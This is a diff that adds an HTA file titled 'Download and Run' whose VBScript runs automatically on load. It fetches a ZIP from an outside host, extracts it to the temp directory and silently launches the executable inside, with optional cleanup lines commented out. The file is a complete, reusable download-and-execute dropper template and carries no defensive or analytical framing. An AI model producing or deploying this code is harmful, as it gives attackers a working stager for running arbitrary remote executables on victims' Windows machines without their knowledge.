@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Download and Run</title>
+    <HTA:APPLICATION ID="app" APPLICATIONNAME="Download and Run" BORDER="thin" BORDERSTYLE="normal" CAPTION="yes" SHOWINTASKBAR="yes" SINGLEINSTANCE="yes" SYSMENU="yes" WINDOWSTATE="normal" />
+    <script language="VBScript">
+        Sub RunProcess
+            ' Define the URL of the ZIP file and the local paths
+            zipUrl = "https://mywebsite.lol/path/to/your/file.zip"
+            tempDir = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\TempDownload"
+            zipPath = tempDir & "\file.zip"
+            exePath = tempDir & "\yourfile.exe"
+
+            ' Create a temporary directory
+            CreateObject("Scripting.FileSystemObject").CreateFolder(tempDir)
+
+            ' Download the ZIP file
+            Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
+            xmlHttp.Open "GET", zipUrl, False
+            xmlHttp.Send
+            If xmlHttp.Status = 200 Then
+                Set stream = CreateObject("ADODB.Stream")
+                stream.Open
+                stream.Type = 1
+                stream.Write xmlHttp.ResponseBody
+                stream.SaveToFile zipPath, 2
+                stream.Close
+            Else
+                MsgBox "Failed to download the file."
+                Exit Sub
+            End If
+
+            ' Unzip the file
+            Set shell = CreateObject("Shell.Application")
+            Set zipFolder = shell.NameSpace(zipPath)
+            Set destFolder = shell.NameSpace(tempDir)
+            destFolder.CopyHere zipFolder.Items, 16
+
+            ' Run the EXE file
+            Set objShell = CreateObject("WScript.Shell")
+            objShell.Run """" & exePath & """", 1, False
+
+            ' Clean up (optional)
+            ' CreateObject("Scripting.FileSystemObject").DeleteFile(zipPath)
+            ' CreateObject("Scripting.FileSystemObject").DeleteFolder(tempDir)
+        End Sub
+    </script>
+</head>
+<body>
+    <script language="VBScript">
+        RunProcess
+    </script>
+</body>
+</html>
